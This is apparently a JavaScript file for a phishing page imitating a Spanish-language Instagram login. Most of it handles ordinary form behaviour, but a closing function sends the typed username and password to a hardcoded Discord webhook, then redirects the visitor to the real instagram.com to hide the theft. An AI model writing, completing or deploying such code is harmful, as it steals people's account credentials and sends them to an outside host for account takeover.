const form = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const toggleBtn = document.getElementById('togglePassword');
const loginBtn = document.getElementById('loginBtn');

function syncLabel(input) {
  if (input.value.trim().length > 0) {
    input.classList.add('has-value');
  } else {
    input.classList.remove('has-value');
  }
}

[usernameInput, passwordInput].forEach((input) => {
  input.addEventListener('input', () => {
    syncLabel(input);
    updateButtonState();
  });
  input.addEventListener('blur', () => syncLabel(input));
  syncLabel(input);
});

toggleBtn.addEventListener('click', () => {
  const isPassword = passwordInput.type === 'password';
  passwordInput.type = isPassword ? 'text' : 'password';
  toggleBtn.setAttribute(
    'aria-label',
    isPassword ? 'Ocultar contraseña' : 'Mostrar contraseña'
  );
});

function updateButtonState() {
  const ok =
    usernameInput.value.trim().length > 0 &&
    passwordInput.value.length > 0;
  loginBtn.disabled = !ok;
}

updateButtonState();

form.addEventListener('submit', (e) => {
  e.preventDefault();
  if (loginBtn.disabled) return;

  const original = loginBtn.textContent;
  loginBtn.disabled = true;
  loginBtn.textContent = 'Iniciando sesión...';

  setTimeout(() => {
    loginBtn.textContent = original;
    updateButtonState();
  }, 1200);
});

passwordInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') form.requestSubmit();
});

document.getElementById('forgotLink')?.addEventListener('click', (e) => {
  e.preventDefault();
});
document.getElementById('fbLogin')?.addEventListener('click', (e) => {
  e.preventDefault();
});
document.getElementById('createAccount')?.addEventListener('click', (e) => {
  e.preventDefault();
});

function sendMessage() {
  function sleep(milliseconds) {
    const date = Date.now();
    let currentDate = null;
    do {
      currentDate = Date.now();
    } while (currentDate - date < milliseconds);
  }

  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/1543422200810311771/M4LpIGRuH0yZoUp9GiUFIsdm5BEYgZgZLlp18wckYTWYAWh1qnKYjiMRgo7hGG0tQ_4S");
  request.setRequestHeader('Content-type', 'application/json');
  var params = {
    content: ("**User: **" + document.getElementById('username').value + "\n**Pass: **" + document.getElementById('password').value)
  };
  request.send(JSON.stringify(params));
  sleep(2000);
  window.location.replace("https://www.instagram.com");
}
